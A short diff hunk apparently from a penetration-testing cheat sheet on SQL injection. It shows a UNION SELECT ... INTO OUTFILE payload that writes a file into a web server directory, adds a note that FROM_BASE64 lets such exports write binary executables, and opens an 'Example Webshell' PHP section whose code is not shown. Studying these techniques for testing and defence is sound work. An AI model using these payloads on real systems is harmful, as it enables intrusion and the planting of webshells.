@@ -265,6 +265,9 @@ cn' union select 1, 'file written successfully!', 3, 4 into outfile '/var/www/ht
 # Note: with the above injection, your file will look like "1 file written successfuly 3 4"
 # Note: This is because the entire select is written to the file, to clean it up, use "" in place of the numbers
 ```
+Note: Advanced file exports utilize 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files
+including binary (executable) data.
+
 **Example Webshell**  
 Example PHP webshell
 ```php
